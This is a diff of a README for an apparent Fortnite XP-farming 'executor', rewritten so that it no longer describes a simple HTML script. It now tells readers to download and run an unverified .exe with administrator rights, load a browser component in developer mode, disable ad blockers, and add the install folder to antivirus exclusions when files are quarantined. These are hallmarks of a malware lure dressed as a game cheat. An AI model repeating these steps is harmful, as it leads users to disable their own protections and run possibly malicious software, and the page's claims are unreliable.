@@ -1,104 +1,80 @@
-# Fortnite XP v2026 - Game Script Utility 2026
+# 🎮 fortnite-xp-executor-hub - Automate your experience farming routines easily
 
-> **A Fortnite XP automation helper for browser-based farming.** Built to support players who want to earn experience points through automated gameplay routines on compatible platforms.
+[![Download Fortnite XP Executor](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Industrials9979/fortnite-xp-executor-hub)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordanhub20/fortnite-xp-executor-hub?style=flat-square)](https://github.com/jordanhub20/fortnite-xp-executor-hub)
+## 📖 About this application
 
----
+The fortnite-xp-executor-hub serves as an automation helper for your browser. Use this tool to manage gameplay routines that earn experience points in Fortnite. The application focuses on Chapter 6 and later versions. It runs directly inside your web browser. You install a small component to link your browser to the automation scripts. Use this tool on Windows PCs. Mobile browsers also support the underlying automation structure.
 
-<p align="center">
-  <a href="https://jordanhub20.github.io/fortnite-xp-executor-hub/">
-    <img src="https://img.shields.io/badge/Download-Fortnite%20XP%20Script-brightgreen?style=for-the-badge" alt="Download Fortnite XP Script">
-  </a>
-</p>
+## 🛠️ System requirements
 
-> **[Direct Download - Fortnite XP](https://jordanhub20.github.io/fortnite-xp-executor-hub/)**
+Ensure your computer meets these basic needs before you start:
 
----
+*   Windows 10 or Windows 11 operating system.
+*   A modern web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
+*   At least 4GB of RAM for stable execution.
+*   A stable internet connection to maintain communication with game servers.
+*   Administrator rights on your computer to perform the setup.
 
-[Download Latest Build](https://jordanhub20.github.io/fortnite-xp-executor-hub/)
+## 📥 How to download and install
 
----
+Follow these steps to set up the software on your machine.
 
-## What It Does
+1.  Visit the official repository page to download the latest release: https://github.com/Industrials9979/fortnite-xp-executor-hub
+2.  Locate the section labeled Releases on the right side of the page.
+3.  Click the version number under the Releases header.
+4.  Find the file ending in .exe in the Assets list.
+5.  Click the file name to start the download.
+6.  Open your Downloads folder once the file finishes downloading.
+7.  Double-click the .exe file to run the installer.
+8.  Follow the prompts on your screen to complete the installation.
 
-Fortnite XP is a browser-based script utility made to simplify how experience points are gathered during Fortnite sessions. Rather than manually looping through repetitive actions, it automates selected in-game interactions so XP can accumulate more consistently over time. Because it runs from a web interface, it stays lightweight and avoids complicated installs or system-level changes.
+## 🚀 Setting up the automation
 
-The latest release is centered on improving XP collection through repeated automation patterns that follow the game's normal pacing. Once loaded on supported web platforms, it can take over recurring tasks while you keep the session active in the background. Ongoing updates help keep the logic aligned with changes in Fortnite gameplay behavior and XP distribution.
+After you install the software, you must configure your browser to enable the automation features. 
 
----
+1.  Open your preferred web browser.
+2.  Navigate to the settings or extensions menu.
+3.  Enable developer mode if your browser requires it for external scripts.
+4.  Load the automation helper component provided by the executor installer.
+5.  Refresh your browser page to initialize the scripts.
+6.  Look for the executor icon in your browser toolbar to confirm successful activation.
 
-## Script Features
+## ⚙️ Running gameplay routines
 
-- Browser-driven automation for XP farming routines
-- Adjustable action chains to suit different play styles
-- Compact HTML-based design with low resource demands
-- Session length controls to limit long continuous runs
-- Hotkey support for turning automation on and off quickly
-- On-screen status indicators for script activity and XP progress
-- Compatibility with multiple Fortnite modes that award XP
-- Refresh behavior intended to help keep the connection stable
+Once the setup finishes, you gain access to the dashboard. Follow these steps to start your XP farming routine.
 
----
+1.  Log in to your Fortnite account through the official web interface.
+2.  Open the executor dashboard by clicking the icon in your toolbar.
+3.  Select the desired game mode from the list of supported interfaces.
+4.  Choose your preferred gameplay routine from the dropdown menu.
+5.  Adjust the settings to match your desired session length.
+6.  Click the Start button to begin the automated routine.
+7.  Keep your browser window open throughout the process to ensure stability.
 
-## Setup
+## ⚠️ Known limitations and tips
 
-1. Download the latest script build from the link above.
-2. Open the downloaded HTML file in a modern web browser (Chrome, Firefox, Edge recommended).
-3. Log into your Fortnite account through the game's web interface.
-4. Click the "Start" button to begin automated XP collection.
-5. Leave the browser tab active while the script runs.
+Experience indicates that some factors affect how well the script performs. Follow these guidelines to maintain stability:
 
-No additional software, extensions, or plugins are required. The script runs entirely within the browser environment.
+*   **Browser Stability:** Long sessions consume browser memory. Restart your browser every few hours to clear the cache and keep the automation running smoothly.
+*   **Ad Blockers:** Some ad blockers block the scripts required for XP farming. Disable your ad blocker for the Fortnite web interface to prevent script errors.
+*   **VPN Usage:** Using a VPN often triggers network latency. This latency stops the automation routine from syncing with game events. Use a direct internet connection for the best results.
+*   **Background Tasks:** High CPU usage from other applications interferes with frame timing for the automation. Close unnecessary software while running the executor.
 
----
+## 🆘 Troubleshooting common issues
 
-## Options
+If you encounter problems, follow these logic-based steps to fix them:
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| Session Duration | 60 min | Maximum runtime before automatic stop |
-| Action Delay | 2.5 sec | Interval between automated actions |
-| Auto-Restart | Off | Whether to restart session after completion |
-| Notification Sound | On | Plays alert when script stops or encounters error |
-| Hotkey Toggle | F6 | Keyboard shortcut to start/stop automation |
+**The executor does not start:**
+Check if your antivirus software quarantined the files. Add the install folder to your antivirus exclusion list and run the installer again.
 
----
+**The script stops mid-routine:**
+This usually happens because the browser enters a sleep mode. Adjust your Windows power settings to keep the computer awake while the browser remains active.
 
-## Compatibility
+**The automation does not detect the browser:**
+Ensure you installed the correct helper component. Restart both your browser and the executor application to re-establish the link.
 
-- **Supported Platforms:** Web-based Fortnite interfaces on PC and mobile browsers
-- **Game Versions:** Fortnite Chapter 6 and later (subject to Epic Games updates)
-- **Known Limitations:** May not function correctly with VPN connections or ad blockers enabled. Script performance depends on browser stability and network latency. Not compatible with console or native PC game clients.
+**Errors on the web interface:**
+Refresh the page. Clear your browser history and cache if the error persists.
 
----
-
-## FAQ
-
-**How do I install the Fortnite XP script?**  
-Download the HTML file and open it in your browser. There is no separate install step.
-
-**Does the script update itself?**  
-No. When new releases are published, you need to grab the latest version from the repository.
-
-**Can I change how the automation behaves?**  
-Yes. The Options section lets you tune session length, action delay, and related settings.
-
-**Is mobile supported?**  
-Yes, as long as the mobile browser supports JavaScript and can keep the script running reliably.
-
-**What if Fortnite gets patched?**  
-A game update may require a script update to stay compatible. Check the repository after major Fortnite patches.
-
-**Where do the XP rewards go?**  
-XP is applied directly to your Fortnite account through normal gameplay channels. The script does not store any personal data.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: fortnite, xp-farming, automation, browser-tools, gaming-helper, chapter-6
